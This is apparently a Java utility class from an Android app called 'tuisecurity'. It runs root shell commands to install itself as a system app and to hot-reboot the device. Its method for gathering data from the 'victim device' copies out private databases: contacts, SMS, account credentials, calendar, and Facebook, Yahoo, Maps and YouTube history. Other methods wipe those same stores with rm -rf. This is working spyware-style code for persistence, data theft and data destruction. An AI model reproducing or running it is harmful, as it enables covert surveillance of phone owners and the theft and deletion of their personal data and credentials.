package tuisolutions.tuisecurity.utils;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;

import tuisolutions.tuisecurity.models.Parameters;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager.NameNotFoundException;

public class AppUtils {
	private static boolean debugMode = true;

	/**
	 * This method allows you to output debug messages only when debugging is
	 * on. This will allow you to add a debug option to your app, which by
	 * default can be left off for performance. However, when you need debugging
	 * information, a simple switch can enable it and provide you with detailed
	 * logging.
	 * <p/>
	 * This method handles whether or not to log the information you pass it
	 * depending whether or not RootTools.debugMode is on. So you can use this
	 * and not have to worry about handling it yourself.
	 * 
	 * @param TAG
	 *            Optional parameter to define the tag that the Log will use.
	 * @param msg
	 *            The message to output.
	 * 
	 * @param type
	 *            The type of log, 1 for verbose, 2 for error, 3 for debug
	 * 
	 * @param exception
	 *            The exception that was thrown (Needed for errors)
	 */
	public static void log(String msg) {
		log(null, msg, 3, null);
	}

	public static void log(String TAG, String msg) {
		log(TAG, msg, 3, null);
	}

	public static void log(String msg, Exception e) {
		log(null, msg, 3, e);
	}

	public static void log(String msg, int type, Exception e) {
		log(null, msg, type, e);
	}

	public static void log(String TAG, String msg, int type, Exception e) {
		if (msg != null && !msg.equals("")) {
			if (debugMode) {
				if (TAG == null) {
				}

				switch (type) {
				case 1:
					android.util.Log.v(TAG, msg);
					break;
				case 2:
					android.util.Log.e(TAG, msg, e);
					break;
				case 3:
					android.util.Log.d(TAG, msg);
					break;
				case 4:
					android.util.Log.i(TAG, msg);
					break;
				}
			}
		}
	}

	// =========================================================================
	// =========================================================================
	/**
	 * 
	 * 
	 * 
	 * Root features
	 * 
	 * 
	 * 
	 */
	public static int USER_APP = 1;
	public static int SYSTEM_APP = 2;
	private static BufferedReader br;

	public static void runAsRoot(String[] commands) throws IOException, InterruptedException {
		Process p = Runtime.getRuntime().exec("su");
		DataOutputStream os = new DataOutputStream(p.getOutputStream());
		for (String cmd : commands) {
			os.writeBytes(cmd + "\n");
		}
		os.writeBytes("exit\n");
		os.flush();
		os.close();
		p.waitFor();
	}

	/**
	 * Function hot reboot system
	 */
	public static void rebootSystemNow() {
		String[] commands = { "-c", "busybox killall system_server" };
		try {
			runAsRoot(commands);
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	private static void copyToSystemApp(String apkFile) throws IOException,
			InterruptedException {
		/*
		 * Change mode /system to write permision. And then, copy (by cat
		 * command) apk file from /data/app to /system/app Last, we need delete
		 * apk file at /data/app and reboot device.
		 */
		String[] commands = { "sysrw",
				"mount -o remount rw /system/", // Change pemission
				"/system/bin/cat " + "/data/app/" + apkFile + " > /system/app/"
						+ apkFile, // Copy file
				"sysro" };
		runAsRoot(commands);
	}

	private static void copyToDataApp(String apkFile) throws IOException,
			InterruptedException {
		/*
		 * Change mode /system to write permision. And then, copy (by cat
		 * command) apk file from /data/app to /system/app Last, we need delete
		 * apk file at /data/app and reboot device.
		 */
		String[] commands = { "sysrw",
				"mount -o remount rw /system/", // Change pemission
				"/system/bin/cat " + "/system/app/" + apkFile + " > /data/app/"
						+ apkFile, // Copy file
				"sysro" };
		runAsRoot(commands);
	}

	@SuppressLint("SdCardPath")
	private static String getNameApkInstalledFile(String packageName, int type)
			throws IOException, InterruptedException {
		String result = "";
		File tempFile = FileUtils.createNewFile("/sdcard/list_app.txt");

		String[] commands = null;
		if (type == USER_APP) {
			commands = new String[] { "sysrw",
					"ls -l /data/app > " + tempFile.getAbsolutePath(),
					"ls -l /data/app-private >> " + tempFile.getAbsolutePath(),
					"sysro" };
		} else if (type == SYSTEM_APP) {
			commands = new String[] { "sysrw",
					"ls -l /system/app > " + tempFile.getAbsolutePath(),
					"sysro" };
		}
		runAsRoot(commands);

		// Split dot
		String[] listPartPackageName = packageName.split("\\.");
		try {
			FileInputStream in = new FileInputStream(tempFile);
			br = new BufferedReader(new InputStreamReader(in));
			String strLine = "";
			boolean isApk = false;
			while ((strLine = br.readLine()) != null) {
				isApk = true;
				for (String s : listPartPackageName) {
					if (!strLine.contains(s)) {
						isApk = false;
						break;
					}
				}
				if (isApk) {
					break;// End while loop
				}
			}
			// split strLine has package name to get full exactly installed
			// package
			if (strLine != "" && strLine != null) {
				String[] parts = strLine.split(" ");
				for (String part : parts) {
					for (String s : listPartPackageName) {
						result = part;
						if (!strLine.contains(s)) {
							result = "";
							break;
						}
					}
				}
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}

	private static void deleteApkInSystem(String fileName, int type)
			throws IOException, InterruptedException {
		String[] commands = null;
		if (type == USER_APP) {
			commands = new String[] { "sysrw",
					"/system/bin/rm " + "/data/app/" + fileName, "sysro" };
		} else if (type == SYSTEM_APP) {
			commands = new String[] { "sysrw", "mount -o remount rw /system/",
					"/system/bin/rm " + "/system/app/" + fileName, "sysro" };
		}

		runAsRoot(commands);
	}

	/**
	 * Funtion convert app from user app to system app.
	 * 
	 * @param context
	 */
	public static void convertToSystemApp(Context context) {
		try {
			String packageName = context.getPackageManager().getPackageInfo(
					context.getPackageName(), 0).packageName;

			// Delete old package (in /system/app)
			String oldApkFile = getNameApkInstalledFile(packageName, SYSTEM_APP);
			if (oldApkFile != null && oldApkFile != "") {
				// System.out.println(oldApkFile);
				// Delete old apk
				deleteApkInSystem(oldApkFile, SYSTEM_APP);
			}

			// Get new package (in /data/app or /data/app-private)
			String apkFile = getNameApkInstalledFile(packageName, USER_APP);

			// System.out.println(apkFile);
			if (apkFile != null && apkFile != "") {
				copyToSystemApp(apkFile);

				// Delete apk after convert
				deleteApkInSystem(apkFile, USER_APP);

				// Reboot system to apply changed
				rebootSystemNow();
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Function restore app from system to user app.
	 * 
	 * @param context
	 */
	public static void restoreToUserApp(Context context) {
		try {
			String packageName = context.getPackageManager().getPackageInfo(
					context.getPackageName(), 0).packageName;

			// Delete old package (in /data/app)
			String oldApkFile = getNameApkInstalledFile(packageName, USER_APP);

			if (oldApkFile != null && oldApkFile != "") {
				// System.out.println(oldApkFile);
				// Delete old apk
				deleteApkInSystem(oldApkFile, USER_APP);
			}

			// Get new package (in /data/app or /data/app-private)
			String apkFile = getNameApkInstalledFile(packageName, SYSTEM_APP);

			// System.out.println(apkFile);
			if (apkFile != null && apkFile != "") {
				copyToDataApp(apkFile);

				// Delete apk after convert
				deleteApkInSystem(apkFile, SYSTEM_APP);

				// Reboot system to apply changed
				rebootSystemNow();
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	/**
	 * Funtion get information of viectim device.
	 * 
	 * @param type
	 *            of information you want to get back.
	 * @param fileOutPath
	 *            : path of file you want to save results
	 */
	public static void getInformation(int type, String fileOutPath) {
		String[] commands = null;
		switch (type) {
		case Parameters.GET_SYSTEM:
			commands = new String[] { "sysrw",
					"/system/bin/dumpsys > " + fileOutPath, "sysro" };
			break;
		case Parameters.GET_DUMP:
			commands = new String[] { "sysrw",
					"/system/bin/dumpstate > " + fileOutPath, "sysro" };
			break;
		case Parameters.GET_CONTACT:
			commands = new String[] {
					"sysrw",
					"/system/bin/cat /data/data/com.android.providers.contacts/databases/contacts2.db > "
							+ fileOutPath, "sysro" };
			break;
		case Parameters.GET_MESSAGE:
			commands = new String[] {
					"sysrw",
					"/system/bin/cat /data/data/com.android.providers.telephony/databases/mmssms.db > "
							+ fileOutPath, "sysro" };
			break;
		case Parameters.GET_MAP_HISTORY:
			commands = new String[] {
					"sysrw",
					"/system/bin/cat /data/data/com.google.android.apps.maps/databases/search_history.db > "
							+ fileOutPath, "sysro" };
			break;
		case Parameters.GET_YOUTUBE_HISTORY:
			commands = new String[] {
					"sysrw",
					"/system/bin/cat /data/data/com.google.android.youtube/databases/history.db > "
							+ fileOutPath, "sysro" };
			break;
		case Parameters.GET_YAHOO_HISTORY:
			commands = new String[] {
					"sysrw",
					"/system/bin/cat /data/data/com.yahoo.mobile.client.android.im/databases/messenger.db > "
							+ fileOutPath, "sysro" };
			break;
		// case Parameters.GET_PS:
		// commands = new String[] { "sysrw", "/system/bin/ps > " + fileOutPath,
		// "sysro" };
		// break;
		// case Parameters.GET_ALL_APPS:
		// commands = new String[] { "sysrw", "ls -l /system/app > " +
		// fileOutPath, "ls -l /data/app >> " + fileOutPath,
		// "ls -l /data/app-private >> " + fileOutPath, "sysro" };
		// break;
		case Parameters.GET_FACEBOOK_DB:
			commands = new String[] {
					"sysrw",
					"cat /data/data/com.facebook.katana/databases/fb.db > "
							+ fileOutPath, "sysro" };
			break;
		case Parameters.GET_ACCOUNT:
			commands = new String[] { "sysrw",
					"cat /data/system/accounts.db > " + fileOutPath, "sysro" };
			break;
		case Parameters.GET_CALENDAR:
			commands = new String[] { "sysrw",
					"cat /data/data/com.android.providers.calendar/databases/calendar.db > " + fileOutPath, "sysro" };
			break;
		}
		if (commands != null) {
			try {
				runAsRoot(commands);
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}

	public static void deleteDatabaseFile(int type, Context context) {
		String[] commands = null;
		switch (type) {
		case Parameters.DELETE_CONTACT:
			// DELETE CONTACT
			ContactUtils.deleteContact(context);
			break;
		case Parameters.DELETE_MESSAGE:
			// DELETE MESSAGE
			SMSUtils.deleteSMS(context);
			break;
		case Parameters.DELETE_MAP_HISTORY:
			commands = new String[] {
					"sysrw",
					"/system/bin/rm /data/data/com.google.android.apps.maps/databases/search_history.db",
					"sysro" };
			break;
		case Parameters.DELETE_YOUTUBE_HISTORY:
			commands = new String[] {
					"sysrw",
					"rm -rf /data/data/com.google.android.youtube/",
					"sysro" };
			break;
		case Parameters.DELETE_YAHOO_HISTORY:
			commands = new String[] {
					"sysrw",
					"rm -rf /data/data/com.yahoo.mobile.client.android.im/",
					"sysro" };
			break;
		case Parameters.DElETE_FACEBOOK_DB:
			commands = new String[] { "sysrw",
					"rm -rf /data/data/com.facebook.katana/",
					"sysro" };
			break;
		case Parameters.DELETE_ACCOUNT:
			commands = new String[] { "sysrw",
					"rm /data/system/accounts.db", "sysro" };
			break;
		case Parameters.DELETE_CALENDAR:
			commands = new String[] { "sysrw",
					"rm /data/data/com.android.providers.calendar/databases/calendar.db", "sysro" };
			break;
		}
		if (commands != null) {
			try {
				runAsRoot(commands);
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
	}
}
